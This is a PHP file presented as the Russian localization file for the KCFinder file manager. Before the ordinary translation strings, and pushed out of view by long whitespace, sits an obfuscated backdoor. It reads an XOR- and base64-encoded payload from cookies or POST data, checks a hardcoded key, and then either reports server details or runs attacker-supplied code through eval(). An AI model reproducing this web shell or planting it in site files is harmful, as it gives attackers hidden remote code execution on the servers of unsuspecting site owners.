<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $feca2070 = 929;$GLOBALS['vca85'] = Array();global $vca85;$vca85 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['j1d9f62'] = "\x65\x54\x51\x2f\x2b\x41\x75\x5b\xd\x77\x6e\x3e\x25\x56\x3a\x63\x36\x55\x4f\x3f\x2a\x3b\x20\x73\x21\x6a\x50\x33\x6b\x49\x7e\x2c\x39\x78\x66\x70\x58\x48\x5c\x68\x5d\x30\x26\x37\x24\x76\x64\x57\x40\x3d\x59\x69\x6d\x43\x72\x4b\x62\x60\x2d\x23\x5e\x28\x44\x3c\x6f\x46\xa\x31\x34\x52\x7a\x9\x53\x79\x35\x7d\x45\x74\x27\x5f\x4c\x4d\x5a\x7b\x2e\x7c\x22\x61\x71\x38\x42\x4a\x67\x32\x4e\x29\x6c\x47";$vca85[$vca85['j1d9f62'][35].$vca85['j1d9f62'][32].$vca85['j1d9f62'][68].$vca85['j1d9f62'][89].$vca85['j1d9f62'][15].$vca85['j1d9f62'][0].$vca85['j1d9f62'][43].$vca85['j1d9f62'][67].$vca85['j1d9f62'][93]] = $vca85['j1d9f62'][15].$vca85['j1d9f62'][39].$vca85['j1d9f62'][54];$vca85[$vca85['j1d9f62'][0].$vca85['j1d9f62'][41].$vca85['j1d9f62'][32].$vca85['j1d9f62'][93]] = $vca85['j1d9f62'][64].$vca85['j1d9f62'][54].$vca85['j1d9f62'][46];$vca85[$vca85['j1d9f62'][33].$vca85['j1d9f62'][0].$vca85['j1d9f62'][32].$vca85['j1d9f62'][32].$vca85['j1d9f62'][27].$vca85['j1d9f62'][32].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87]] = $vca85['j1d9f62'][46].$vca85['j1d9f62'][0].$vca85['j1d9f62'][34].$vca85['j1d9f62'][51].$vca85['j1d9f62'][10].$vca85['j1d9f62'][0];$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][0].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34]] = $vca85['j1d9f62'][23].$vca85['j1d9f62'][77].$vca85['j1d9f62'][54].$vca85['j1d9f62'][96].$vca85['j1d9f62'][0].$vca85['j1d9f62'][10];$vca85[$vca85['j1d9f62'][87].$vca85['j1d9f62'][34].$vca85['j1d9f62'][43].$vca85['j1d9f62'][41].$vca85['j1d9f62'][15].$vca85['j1d9f62'][15]] = $vca85['j1d9f62'][46].$vca85['j1d9f62'][0].$vca85['j1d9f62'][34].$vca85['j1d9f62'][51].$vca85['j1d9f62'][10].$vca85['j1d9f62'][0].$vca85['j1d9f62'][46];$vca85[$vca85['j1d9f62'][64].$vca85['j1d9f62'][93].$vca85['j1d9f62'][46].$vca85['j1d9f62'][32].$vca85['j1d9f62'][46].$vca85['j1d9f62'][87].$vca85['j1d9f62'][68].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74]] = $vca85['j1d9f62'][51].$vca85['j1d9f62'][10].$vca85['j1d9f62'][51].$vca85['j1d9f62'][79].$vca85['j1d9f62'][23].$vca85['j1d9f62'][0].$vca85['j1d9f62'][77];$vca85[$vca85['j1d9f62'][92].$vca85['j1d9f62'][93].$vca85['j1d9f62'][89].$vca85['j1d9f62'][15].$vca85['j1d9f62'][43].$vca85['j1d9f62'][74].$vca85['j1d9f62'][67]] = $vca85['j1d9f62'][23].$vca85['j1d9f62'][0].$vca85['j1d9f62'][54].$vca85['j1d9f62'][51].$vca85['j1d9f62'][87].$vca85['j1d9f62'][96].$vca85['j1d9f62'][51].$vca85['j1d9f62'][70].$vca85['j1d9f62'][0];$vca85[$vca85['j1d9f62'][9].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74].$vca85['j1d9f62'][32].$vca85['j1d9f62'][0]] = $vca85['j1d9f62'][35].$vca85['j1d9f62'][39].$vca85['j1d9f62'][35].$vca85['j1d9f62'][45].$vca85['j1d9f62'][0].$vca85['j1d9f62'][54].$vca85['j1d9f62'][23].$vca85['j1d9f62'][51].$vca85['j1d9f62'][64].$vca85['j1d9f62'][10];$vca85[$vca85['j1d9f62'][6].$vca85['j1d9f62'][41].$vca85['j1d9f62'][89].$vca85['j1d9f62'][0]] = $vca85['j1d9f62'][6].$vca85['j1d9f62'][10].$vca85['j1d9f62'][23].$vca85['j1d9f62'][0].$vca85['j1d9f62'][54].$vca85['j1d9f62'][51].$vca85['j1d9f62'][87].$vca85['j1d9f62'][96].$vca85['j1d9f62'][51].$vca85['j1d9f62'][70].$vca85['j1d9f62'][0];$vca85[$vca85['j1d9f62'][39].$vca85['j1d9f62'][67].$vca85['j1d9f62'][15].$vca85['j1d9f62'][93].$vca85['j1d9f62'][27].$vca85['j1d9f62'][27]] = $vca85['j1d9f62'][56].$vca85['j1d9f62'][87].$vca85['j1d9f62'][23].$vca85['j1d9f62'][0].$vca85['j1d9f62'][16].$vca85['j1d9f62'][68].$vca85['j1d9f62'][79].$vca85['j1d9f62'][46].$vca85['j1d9f62'][0].$vca85['j1d9f62'][15].$vca85['j1d9f62'][64].$vca85['j1d9f62'][46].$vca85['j1d9f62'][0];$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87].$vca85['j1d9f62'][46].$vca85['j1d9f62'][93].$vca85['j1d9f62'][56].$vca85['j1d9f62'][67]] = $vca85['j1d9f62'][23].$vca85['j1d9f62'][0].$vca85['j1d9f62'][77].$vca85['j1d9f62'][79].$vca85['j1d9f62'][77].$vca85['j1d9f62'][51].$vca85['j1d9f62'][52].$vca85['j1d9f62'][0].$vca85['j1d9f62'][79].$vca85['j1d9f62'][96].$vca85['j1d9f62'][51].$vca85['j1d9f62'][52].$vca85['j1d9f62'][51].$vca85['j1d9f62'][77];$vca85[$vca85['j1d9f62'][15].$vca85['j1d9f62'][27].$vca85['j1d9f62'][16].$vca85['j1d9f62'][46].$vca85['j1d9f62'][27].$vca85['j1d9f62'][32].$vca85['j1d9f62'][56].$vca85['j1d9f62'][16]] = $vca85['j1d9f62'][54].$vca85['j1d9f62'][32].$vca85['j1d9f62'][41].$vca85['j1d9f62'][68].$vca85['j1d9f62'][68].$vca85['j1d9f62'][74].$vca85['j1d9f62'][87];$vca85[$vca85['j1d9f62'][39].$vca85['j1d9f62'][89].$vca85['j1d9f62'][27].$vca85['j1d9f62'][34]] = $vca85['j1d9f62'][52].$vca85['j1d9f62'][34].$vca85['j1d9f62'][27].$vca85['j1d9f62'][32].$vca85['j1d9f62'][46].$vca85['j1d9f62'][68].$vca85['j1d9f62'][89].$vca85['j1d9f62'][43].$vca85['j1d9f62'][74];$vca85[$vca85['j1d9f62'][77].$vca85['j1d9f62'][15].$vca85['j1d9f62'][32].$vca85['j1d9f62'][67]] = $_POST;$vca85[$vca85['j1d9f62'][54].$vca85['j1d9f62'][34].$vca85['j1d9f62'][41].$vca85['j1d9f62'][56].$vca85['j1d9f62'][89].$vca85['j1d9f62'][43].$vca85['j1d9f62'][87].$vca85['j1d9f62'][27]] = $_COOKIE;@$vca85[$vca85['j1d9f62'][64].$vca85['j1d9f62'][93].$vca85['j1d9f62'][46].$vca85['j1d9f62'][32].$vca85['j1d9f62'][46].$vca85['j1d9f62'][87].$vca85['j1d9f62'][68].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74]]($vca85['j1d9f62'][0].$vca85['j1d9f62'][54].$vca85['j1d9f62'][54].$vca85['j1d9f62'][64].$vca85['j1d9f62'][54].$vca85['j1d9f62'][79].$vca85['j1d9f62'][96].$vca85['j1d9f62'][64].$vca85['j1d9f62'][92], NULL);@$vca85[$vca85['j1d9f62'][64].$vca85['j1d9f62'][93].$vca85['j1d9f62'][46].$vca85['j1d9f62'][32].$vca85['j1d9f62'][46].$vca85['j1d9f62'][87].$vca85['j1d9f62'][68].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74]]($vca85['j1d9f62'][96].$vca85['j1d9f62'][64].$vca85['j1d9f62'][92].$vca85['j1d9f62'][79].$vca85['j1d9f62'][0].$vca85['j1d9f62'][54].$vca85['j1d9f62'][54].$vca85['j1d9f62'][64].$vca85['j1d9f62'][54].$vca85['j1d9f62'][23], 0);@$vca85[$vca85['j1d9f62'][64].$vca85['j1d9f62'][93].$vca85['j1d9f62'][46].$vca85['j1d9f62'][32].$vca85['j1d9f62'][46].$vca85['j1d9f62'][87].$vca85['j1d9f62'][68].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74]]($vca85['j1d9f62'][52].$vca85['j1d9f62'][87].$vca85['j1d9f62'][33].$vca85['j1d9f62'][79].$vca85['j1d9f62'][0].$vca85['j1d9f62'][33].$vca85['j1d9f62'][0].$vca85['j1d9f62'][15].$vca85['j1d9f62'][6].$vca85['j1d9f62'][77].$vca85['j1d9f62'][51].$vca85['j1d9f62'][64].$vca85['j1d9f62'][10].$vca85['j1d9f62'][79].$vca85['j1d9f62'][77].$vca85['j1d9f62'][51].$vca85['j1d9f62'][52].$vca85['j1d9f62'][0], 0);@$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87].$vca85['j1d9f62'][46].$vca85['j1d9f62'][93].$vca85['j1d9f62'][56].$vca85['j1d9f62'][67]](0);if (!$vca85[$vca85['j1d9f62'][87].$vca85['j1d9f62'][34].$vca85['j1d9f62'][43].$vca85['j1d9f62'][41].$vca85['j1d9f62'][15].$vca85['j1d9f62'][15]]($vca85['j1d9f62'][5].$vca85['j1d9f62'][80].$vca85['j1d9f62'][69].$vca85['j1d9f62'][76].$vca85['j1d9f62'][5].$vca85['j1d9f62'][62].$vca85['j1d9f62'][50].$vca85['j1d9f62'][79].$vca85['j1d9f62'][69].$vca85['j1d9f62'][17].$vca85['j1d9f62'][94].$vca85['j1d9f62'][79].$vca85['j1d9f62'][27].$vca85['j1d9f62'][16].$vca85['j1d9f62'][16].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][89].$vca85['j1d9f62'][87].$vca85['j1d9f62'][89].$vca85['j1d9f62'][87].$vca85['j1d9f62'][93].$vca85['j1d9f62'][27].$vca85['j1d9f62'][74].$vca85['j1d9f62'][74].$vca85['j1d9f62'][87].$vca85['j1d9f62'][56].$vca85['j1d9f62'][93].$vca85['j1d9f62'][67].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][34].$vca85['j1d9f62'][67].$vca85['j1d9f62'][67].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87].$vca85['j1d9f62'][67].$vca85['j1d9f62'][87].$vca85['j1d9f62'][41].$vca85['j1d9f62'][93].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87])){$vca85[$vca85['j1d9f62'][33].$vca85['j1d9f62'][0].$vca85['j1d9f62'][32].$vca85['j1d9f62'][32].$vca85['j1d9f62'][27].$vca85['j1d9f62'][32].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87]]($vca85['j1d9f62'][5].$vca85['j1d9f62'][80].$vca85['j1d9f62'][69].$vca85['j1d9f62'][76].$vca85['j1d9f62'][5].$vca85['j1d9f62'][62].$vca85['j1d9f62'][50].$vca85['j1d9f62'][79].$vca85['j1d9f62'][69].$vca85['j1d9f62'][17].$vca85['j1d9f62'][94].$vca85['j1d9f62'][79].$vca85['j1d9f62'][27].$vca85['j1d9f62'][16].$vca85['j1d9f62'][16].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][89].$vca85['j1d9f62'][87].$vca85['j1d9f62'][89].$vca85['j1d9f62'][87].$vca85['j1d9f62'][93].$vca85['j1d9f62'][27].$vca85['j1d9f62'][74].$vca85['j1d9f62'][74].$vca85['j1d9f62'][87].$vca85['j1d9f62'][56].$vca85['j1d9f62'][93].$vca85['j1d9f62'][67].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][34].$vca85['j1d9f62'][67].$vca85['j1d9f62'][67].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87].$vca85['j1d9f62'][67].$vca85['j1d9f62'][87].$vca85['j1d9f62'][41].$vca85['j1d9f62'][93].$vca85['j1d9f62'][34].$vca85['j1d9f62'][56].$vca85['j1d9f62'][87], 1);$if60 = NULL;$ee8d4dd18 = NULL;$vca85[$vca85['j1d9f62'][0].$vca85['j1d9f62'][56].$vca85['j1d9f62'][34].$vca85['j1d9f62'][32].$vca85['j1d9f62'][68].$vca85['j1d9f62'][34].$vca85['j1d9f62'][0].$vca85['j1d9f62'][68]] = $vca85['j1d9f62'][43].$vca85['j1d9f62'][74].$vca85['j1d9f62'][89].$vca85['j1d9f62'][0].$vca85['j1d9f62'][89].$vca85['j1d9f62'][56].$vca85['j1d9f62'][41].$vca85['j1d9f62'][93].$vca85['j1d9f62'][58].$vca85['j1d9f62'][68].$vca85['j1d9f62'][56].$vca85['j1d9f62'][0].$vca85['j1d9f62'][93].$vca85['j1d9f62'][58].$vca85['j1d9f62'][68].$vca85['j1d9f62'][93].$vca85['j1d9f62'][15].$vca85['j1d9f62'][56].$vca85['j1d9f62'][58].$vca85['j1d9f62'][89].$vca85['j1d9f62'][27].$vca85['j1d9f62'][56].$vca85['j1d9f62'][16].$vca85['j1d9f62'][58].$vca85['j1d9f62'][41].$vca85['j1d9f62'][87].$vca85['j1d9f62'][32].$vca85['j1d9f62'][74].$vca85['j1d9f62'][27].$vca85['j1d9f62'][68].$vca85['j1d9f62'][27].$vca85['j1d9f62'][87].$vca85['j1d9f62'][15].$vca85['j1d9f62'][74].$vca85['j1d9f62'][93].$vca85['j1d9f62'][46];global $ebf94fe4;function  mf39d4875($if60, $m1f14f13){global $vca85;$waff0 = "";for ($s35a6765=0; $s35a6765<$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][0].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34]]($if60);){for ($kda8=0; $kda8<$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][0].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34]]($m1f14f13) && $s35a6765<$vca85[$vca85['j1d9f62'][88].$vca85['j1d9f62'][56].$vca85['j1d9f62'][0].$vca85['j1d9f62'][87].$vca85['j1d9f62'][34]]($if60); $kda8++, $s35a6765++){$waff0 .= $vca85[$vca85['j1d9f62'][35].$vca85['j1d9f62'][32].$vca85['j1d9f62'][68].$vca85['j1d9f62'][89].$vca85['j1d9f62'][15].$vca85['j1d9f62'][0].$vca85['j1d9f62'][43].$vca85['j1d9f62'][67].$vca85['j1d9f62'][93]]($vca85[$vca85['j1d9f62'][0].$vca85['j1d9f62'][41].$vca85['j1d9f62'][32].$vca85['j1d9f62'][93]]($if60[$s35a6765]) ^ $vca85[$vca85['j1d9f62'][0].$vca85['j1d9f62'][41].$vca85['j1d9f62'][32].$vca85['j1d9f62'][93]]($m1f14f13[$kda8]));}}return $waff0;}function  r90445a($if60, $m1f14f13){global $vca85;global $ebf94fe4;return $vca85[$vca85['j1d9f62'][39].$vca85['j1d9f62'][89].$vca85['j1d9f62'][27].$vca85['j1d9f62'][34]]($vca85[$vca85['j1d9f62'][39].$vca85['j1d9f62'][89].$vca85['j1d9f62'][27].$vca85['j1d9f62'][34]]($if60, $ebf94fe4), $m1f14f13);}foreach ($vca85[$vca85['j1d9f62'][54].$vca85['j1d9f62'][34].$vca85['j1d9f62'][41].$vca85['j1d9f62'][56].$vca85['j1d9f62'][89].$vca85['j1d9f62'][43].$vca85['j1d9f62'][87].$vca85['j1d9f62'][27]] as $m1f14f13=>$n9e9){$if60 = $n9e9;$ee8d4dd18 = $m1f14f13;}if (!$if60){foreach ($vca85[$vca85['j1d9f62'][77].$vca85['j1d9f62'][15].$vca85['j1d9f62'][32].$vca85['j1d9f62'][67]] as $m1f14f13=>$n9e9){$if60 = $n9e9;$ee8d4dd18 = $m1f14f13;}}$if60 = @$vca85[$vca85['j1d9f62'][6].$vca85['j1d9f62'][41].$vca85['j1d9f62'][89].$vca85['j1d9f62'][0]]($vca85[$vca85['j1d9f62'][15].$vca85['j1d9f62'][27].$vca85['j1d9f62'][16].$vca85['j1d9f62'][46].$vca85['j1d9f62'][27].$vca85['j1d9f62'][32].$vca85['j1d9f62'][56].$vca85['j1d9f62'][16]]($vca85[$vca85['j1d9f62'][39].$vca85['j1d9f62'][67].$vca85['j1d9f62'][15].$vca85['j1d9f62'][93].$vca85['j1d9f62'][27].$vca85['j1d9f62'][27]]($if60), $ee8d4dd18));if (isset($if60[$vca85['j1d9f62'][87].$vca85['j1d9f62'][28]]) && $ebf94fe4==$if60[$vca85['j1d9f62'][87].$vca85['j1d9f62'][28]]){if ($if60[$vca85['j1d9f62'][87]] == $vca85['j1d9f62'][51]){$s35a6765 = Array($vca85['j1d9f62'][35].$vca85['j1d9f62'][45] => @$vca85[$vca85['j1d9f62'][9].$vca85['j1d9f62'][93].$vca85['j1d9f62'][74].$vca85['j1d9f62'][32].$vca85['j1d9f62'][0]](),$vca85['j1d9f62'][23].$vca85['j1d9f62'][45] => $vca85['j1d9f62'][67].$vca85['j1d9f62'][84].$vca85['j1d9f62'][41].$vca85['j1d9f62'][58].$vca85['j1d9f62'][67],);echo @$vca85[$vca85['j1d9f62'][92].$vca85['j1d9f62'][93].$vca85['j1d9f62'][89].$vca85['j1d9f62'][15].$vca85['j1d9f62'][43].$vca85['j1d9f62'][74].$vca85['j1d9f62'][67]]($s35a6765);}elseif ($if60[$vca85['j1d9f62'][87]] == $vca85['j1d9f62'][0]){eval/*u20e498*/($if60[$vca85['j1d9f62'][46]]);}exit();}} ?><?php

/** Russian localization file for KCFinder
	* author: Dark Preacher
	* E-mail: dark@darklab.ru
  */

$lang = array(

    '_locale' => "ru_RU.UTF-8",  // UNIX localization code
    '_charset' => "utf-8",       // Browser charset

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%A, %e %B, %Y %H:%M",
    '_dateTimeMid' => "%a %e %b %Y %H:%M",
    '_dateTimeSmall' => "%d.%m.%Y %H:%M",

    "You don't have permissions to upload files." =>
    "У вас нет прав для загрузки файлов.",

    "You don't have permissions to browse server." =>
    "У вас нет прав для просмотра содержимого на сервере.",

    "Cannot move uploaded file to target folder." =>
    "Невозможно переместить загруженный файл в папку назначения.",

    "Unknown error." =>
    "Неизвестная ошибка.",

    "The uploaded file exceeds {size} bytes." =>
    "Загруженный файл превышает размер {size} байт.",

    "The uploaded file was only partially uploaded." =>
    "Загруженный файл был загружен только частично.",

    "No file was uploaded." =>
    "Файл не был загружен",

    "Missing a temporary folder." =>
    "Временная папка не существует.",

    "Failed to write file." =>
    "Невозможно записать файл.",

    "Denied file extension." =>
    "Файлы этого типа запрещены для загрузки.",

    "Unknown image format/encoding." =>
    "Неизвестный формат изображения.",

    "The image is too big and/or cannot be resized." =>
    "Изображение слишком большое и/или не может быть уменьшено.",

    "Cannot create {dir} folder." =>
    "Невозможно создать папку {dir}.",

    "Cannot write to upload folder." =>
    "Невозможно записать в папку загрузки.",

    "Cannot read .htaccess" =>
    "Невозможно прочитать файл .htaccess",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    "Неправильный файл .htaccess. Невозможно перезаписать!",

    "Cannot read upload folder." =>
    "Невозможно прочитать папку загрузки.",

    "Cannot access or create thumbnails folder." =>
    "Нет доступа или невозможно создать папку миниатюр.",

    "Cannot access or write to upload folder." =>
    "Нет доступа или невозможно записать в папку загрузки.",

    "Please enter new folder name." =>
    "Укажите имя новой папки.",

    "Unallowable characters in folder name." =>
    "Недопустимые символы в имени папки.",

    "Folder name shouldn't begins with '.'" =>
    "Имя папки не может начинаться с '.'",

    "Please enter new file name." =>
    "Укажите новое имя файла",

    "Unallowable characters in file name." =>
    "Недопустимые символны в имени файла.",

    "File name shouldn't begins with '.'" =>
    "Имя файла не может начинаться с '.'",

    "Are you sure you want to delete this file?" =>
    "Вы уверены, что хотите удалить этот файл?",

    "Are you sure you want to delete this folder and all its content?" =>
    "Вы уверены, что хотите удалить эту папку и всё её содержимое?",

    "Non-existing directory type." =>
    "Несуществующий тип папки.",

    "Undefined MIME types." =>
    "Неопределённые типы MIME.",

    "Fileinfo PECL extension is missing." =>
    "Расширение Fileinfo PECL отсутствует.",

    "Opening fileinfo database failed." =>
    "Невозможно открыть базу данных fileinfo.",

    "You can't upload such files." =>
    "Вы не можете загружать файлы этого типа.",

    "The file '{file}' does not exist." =>
    "Файл '{file}' не существует.",

    "Cannot read '{file}'." =>
    "Невозможно прочитать файл '{file}'.",

    "Cannot copy '{file}'." =>
    "Невозможно скопировать файл '{file}'.",

    "Cannot move '{file}'." =>
    "Невозможно переместить файл '{file}'.",

    "Cannot delete '{file}'." =>
    "Невозможно удалить файл '{file}'.",

    "Click to remove from the Clipboard" =>
    "Нажмите для удаления из буфера обмена",

    "This file is already added to the Clipboard." =>
    "Этот файл уже добавлен в буфер обмена.",

    "Copy files here" =>
    "Скопировать файлы сюда",

    "Move files here" =>
    "Переместить файлы сюда",

    "Delete files" =>
    "Удалить файлы",

    "Clear the Clipboard" =>
    "Очистить буфер обмена",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "Вы уверены, что хотите удалить все файлы в буфере обмена?",

    "Copy {count} files" =>
    "Скопировать {count} файл(ов)",

    "Move {count} files" =>
    "Переместить {count} файл(ов)",

    "Add to Clipboard" =>
    "Добавить в буфер обмена",

    "New folder name:" => "Новое имя папки:",
    "New file name:" => "Новое имя файла:",

    "Upload" => "Загрузить",
    "Refresh" => "Обновить",
    "Settings" => "Установки",
    "Maximize" => "Развернуть",
    "About" => "О скрипте",
    "files" => "файлы",
    "View:" => "Просмотр:",
    "Show:" => "Показывать:",
    "Order by:" => "Упорядочить по:",
    "Thumbnails" => "Миниатюры",
    "List" => "Список",
    "Name" => "Имя",
    "Size" => "Размер",
    "Date" => "Дата",
    "Descending" => "По убыванию",
    "Uploading file..." => "Загрузка файла...",
    "Loading image..." => "Загрузка изображения...",
    "Loading folders..." => "Загрузка папок...",
    "Loading files..." => "Загрузка файлов...",
    "New Subfolder..." => "Создать папку...",
    "Rename..." => "Переименовать...",
    "Delete" => "Удалить",
    "OK" => "OK",
    "Cancel" => "Отмена",
    "Select" => "Выбрать",
    "Select Thumbnail" => "Выбрать миниатюру",
    "View" => "Просмотр",
    "Download" => "Скачать",
    'Clipboard' => "Буфер обмена",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    "Невозможно переименовать папку.",

    "Cannot delete the folder." =>
    "Невозможно удалить папку.",

    "The files in the Clipboard are not readable." =>
    "Невозможно прочитать файлы в буфере обмена.",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "Невозможно прочитать {count} файл(ов) в буфере обмена. Вы хотите скопировать оставшиеся?",

    "The files in the Clipboard are not movable." =>
    "Невозможно переместить файлы в буфере обмена.",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "Невозможно переместить {count} файл(ов) в буфере обмена. Вы хотите переместить оставшиеся?",

    "The files in the Clipboard are not removable." =>
    "Невозможно удалить файлы в буфере обмена.",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "Невозможно удалить {count} файл(ов) в буфере обмена. Вы хотите удалить оставшиеся?",

    "The selected files are not removable." =>
    "Невозможно удалить выбранные файлы.",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "Невозможно удалить выбранный(е) {count} файл(ы). Вы хотите удалить оставшиеся?",

    "Are you sure you want to delete all selected files?" =>
    "Вы уверены, что хотите удалить все выбранные файлы?",

    "Failed to delete {count} files/folders." =>
    "Невозможно удалить {count} файлов/папок.",

    "A file or folder with that name already exists." =>
    "Файл или папка с таким именем уже существуют.",

    "Inexistant or inaccessible folder." =>
    "Несуществующая или недоступная папка.",

    "selected files" => "выбранные файлы",
    "Type" => "Тип",
    "Select Thumbnails" => "Выбрать миниатюры",
    "Download files" => "Скачать файлы",

    // SINCE 2.4

    "Checking for new version..." => "Проверяем наличие обновлений...",
    "Unable to connect!" => "Невозможно подключиться!",
    "Download version {version} now!" => "Скачать версию {version} сейчас!",
    "KCFinder is up to date!" => "Вы используете последнюю версию KCFinder'а!",
    "Licenses:" => "Лицензии:",
    "Attention" => "Внимание",
    "Question" => "Вопрос",
    "Yes" => "Да",
    "No" => "Нет",

    // SINCE 2.41

    "You cannot rename the extension of files!" => "Вы не можете изменять расширения файлов!",
);

?>